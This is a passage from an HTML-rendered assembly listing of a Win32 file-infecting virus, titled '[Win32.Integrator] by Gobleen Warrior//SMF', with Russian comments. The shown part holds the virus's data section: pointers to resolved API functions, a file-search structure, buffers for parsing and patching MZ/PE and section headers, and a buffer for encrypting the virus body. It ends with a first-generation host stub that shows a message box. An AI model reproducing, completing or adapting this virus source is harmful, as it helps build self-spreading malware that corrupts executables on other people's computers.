</span><span class="sc5">ourGetProfileStringA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourWriteProfileStringA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourlstrcmpi</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ourGetTickCount</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">; FIND структура</span><span class="sc0">
</span><span class="sc5">findstruc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ff_attr</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ff_create_time</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ff_last_access_time</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ff_last_write_time</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ff_file_size_high</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ff_file_size_low</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ff_reserved</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ff_fullname</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ff_dosname</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; Буффер для MZ заголовка</span><span class="sc0">
</span><span class="sc5">mz_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">mz_signat</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; сигнатура</span><span class="sc0">
</span><span class="sc5">mz_lastpage</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; остаток от деления размера файла на 512</span><span class="sc0">
</span><span class="sc5">mz_pagecount</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; результат этого деления+1</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mz_hdrsize</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; размер заголовка ЕХЕ в 16-байтниках</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mz_exe_ss</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; SS файла при загрузке</span><span class="sc0">
</span><span class="sc5">mz_exe_sp</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; SP файла при загрузке</span><span class="sc0">
</span><span class="sc5">mz_chcksum</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mz_exe_ip</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; IP файла при загрузке</span><span class="sc0">
</span><span class="sc5">mz_exe_cs</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; CS файла при загрузке</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mz_overlay</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Номер оверлейного сегмента (0-основной)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mz_pe_pointer</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Смещение PE заголовка</span><span class="sc0">

</span><span class="sc1">; Буффер для PE заголовка</span><span class="sc0">
</span><span class="sc5">pe_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pe_signat</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_cpu_type</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_num_of_objects</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_time_date</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_coff_tbl_pointer</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_coff_tbl_size</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_nt_hdr_size</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_flags</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_magic</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_link_major</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_link_minor</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_size_of_code</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_size_of_init_data</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_size_of_unin_data</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_entry_point_rva</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_base_of_code</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_base_of_data</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_image_base</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_object_align</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_file_align</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_os_major</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_os_minor</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_user_major</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_user_minor</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_subsys_major</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_subsys_minor</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_image_size</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_header_size</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_file_chksum</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_subsys</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_dll_flags</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_stack_reserve_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_stack_commit_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_heap_reserve_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_heap_commit_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_loader_flags</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_num_rva_and_sizes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_export_table_rva</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_export_table_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_import_table_rva</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_import_table_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_resource_table_rva</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_resource_table_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_exception_table_rva</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_exception_table_size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_secutity_table_rva</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_security_table_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_fixup_table_rva</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_fixup_table_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_debug_table_rva</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_debug_table_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_image_descr_tbl_rva</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_image_descr_tbl_size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_machine_table_rva</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_machine_table_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_tls_rva</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_tls_size</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_load_cfg_rva</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_load_cfg_size</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_iat_table_rva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pe_iat_table_size</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">; Буффер для заголовка последней секции</span><span class="sc0">
</span><span class="sc5">sec_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">sec_name</span><span class="sc0">                </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 00 01 02 03 04 05 06 07</span><span class="sc0">
</span><span class="sc5">sec_virtual_size</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 08 09 0a 0b</span><span class="sc0">
</span><span class="sc5">sec_rva</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 0c 0d 0e 0f</span><span class="sc0">
</span><span class="sc5">sec_physical_size</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 10 11 12 13</span><span class="sc0">
</span><span class="sc5">sec_phys_offset</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 14 15 16 17</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23</span><span class="sc0">
</span><span class="sc5">sec_obj_flags</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 24 25 26 27</span><span class="sc0">

</span><span class="sc1">; Буффер для шифровки тела</span><span class="sc0">
</span><span class="sc5">cryptbuf</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">cryptlen</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;╔══════════════════════════════════════════════════════════════════════════╗</span><span class="sc0">
</span><span class="sc1">;║ Данные для первого запуска                                               ║</span><span class="sc0">
</span><span class="sc1">;╚══════════════════════════════════════════════════════════════════════════╝</span><span class="sc0">
</span><span class="sc5">_title</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Win32.Integrator] by Gobleen Warrior//SMF'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_text</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'THANKS A LOT TO ALL PEOPLE, WHICH HELPED ME'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virstart</span><span class="sc0">
</span><span class="sc5">hoststart</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_title</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_text</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">                     </span><span class="sc5">start</span></div></body>
</html>
